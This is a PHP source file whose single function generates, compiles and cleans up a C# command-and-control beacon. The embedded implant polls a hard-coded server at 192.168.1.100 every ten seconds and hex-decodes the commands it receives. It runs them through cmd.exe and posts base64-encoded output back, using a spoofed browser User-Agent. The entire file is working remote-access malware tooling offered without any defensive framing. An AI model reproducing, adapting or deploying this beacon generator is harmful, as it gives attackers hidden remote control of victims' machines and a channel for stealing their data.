<?php

function beacon_create($id)
{
    // C# Code blob
    $csharpCode = '
    using System;
    using System.Text;
    using System.Diagnostics;
    using System.Net;
    using System.Threading;

    namespace test
    {
        class Programm
        {

            static void Main(string[] args)
            {
                string key = "super";
            
                byte[] ba_key = Encoding.Default.GetBytes(key);

                string hex_key = BitConverter.ToString(ba_key);

                hex_key = hex_key.Replace("-", "");
            
                while(true)
                {
                    Thread.Sleep(10000);
                    string dec_cypher = webget();

                    exec(decode(hex_key, dec_cypher));
                }   

            }

            public static string decode(string key, string cypher)
            {

                string decypher = cypher.Substring(key.Length);

                return hexToASCII(decypher);

            }

            public static String hexToASCII(string hex)
            {

                // initialize the ASCII code string as empty.
                String ascii = "";

                for (int i = 0; i < hex.Length; i += 2)
                {
                
                    // extract two characters from hex string
                    String part = hex.Substring(i, 2);
                
                    // change it into base 16 and
                    // typecast as the character
                    char ch = (char)Convert.ToInt64(part, 16);;
                
                    // add this char to final ASCII string
                    ascii = ascii + ch;
                }
                return ascii;
            }

            public static void exec(string cmd)
            {
            
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe"; // the CMD executable to use
                process.StartInfo.Arguments = "/c " + cmd; // the command to run
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();

                string output = process.StandardOutput.ReadToEnd(); // get the command output
                process.WaitForExit();

                byte[] bytes = System.Text.Encoding.UTF8.GetBytes(output); // convert the string to a byte array
                string base64String = Convert.ToBase64String(bytes); // convert the byte array to a Base64-encoded string
                webpost(base64String);

            }

            public static string webget()
            {

                var postData = new System.Collections.Specialized.NameValueCollection
                {
                    { "id", ' . "\"$id\"" . ' },
                    { "action", "get"}
                };
                WebClient wclient = new WebClient();
                wclient.Headers["User-Agent"] ="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
                wclient.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                byte[] response = wclient.UploadValues("http://192.168.1.100/manage", "POST", postData);
                string html = Encoding.ASCII.GetString(response);
            
                return html;
            }

            public static void webpost(string data)
            {
                var postData = new System.Collections.Specialized.NameValueCollection
                {
                    { "id", ' . "\"$id\"" . ' },
                    { "action", "deliver"},
                    { "resp" , data}
                };
                WebClient wclient = new WebClient();
                wclient.Headers["User-Agent"] ="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
                wclient.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                byte[] response = wclient.UploadValues("http://192.168.1.100/manage", "POST", postData);
                string html = Encoding.ASCII.GetString(response);
            }

        }

    }';  

    // Save the C# code to a file
    $csharpFile = $id . ".cs";
    file_put_contents($csharpFile, $csharpCode);

    // Compile the C# code
    shell_exec('/usr/bin/cli-csc ' . $csharpFile);
    shell_exec('/usr/bin/rm ' . $csharpFile);

}

